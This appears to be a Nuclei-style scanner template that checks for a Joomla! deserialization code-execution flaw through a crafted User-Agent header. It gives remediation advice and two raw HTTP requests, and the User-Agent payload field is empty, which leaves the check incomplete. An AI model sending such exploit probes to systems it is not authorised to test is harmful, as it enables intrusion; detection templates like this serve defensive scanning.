id: joomla-unserialized-user_agent
info:
  name: joomla deserialization vulnerability
  author:
  - 折跃
  description: |-
    Joomla! Deserialization Vulnerability
    Joomla! is an open source content management system (CMS).

    A deserialization vulnerability exists in Joomla! that allows an attacker to execute code.
  severity: critical
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program:
    http://www.joomla.org/

    Temporary fix:
    1. Do not put user input or user-controllable parameters directly into the deserialization operation.
    2. Before entering the deserialization function, limit the parameters and filter them.
    3. Encrypt and sign the deserialized data, and ensure that decryption occurs before desequencing.
    4. Add authentication and authorization to the deserialization interface
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body_2,'fb0b32aeafac4591c7ae6d5e58308344')
  raw:
  - |
    GET / HTTP/1.1
    Host: {{Hostname}}
    User-Agent: {{hex_decode("")}}
  - |
    GET / HTTP/1.1
    Host: {{Hostname}}
  req-condition: true
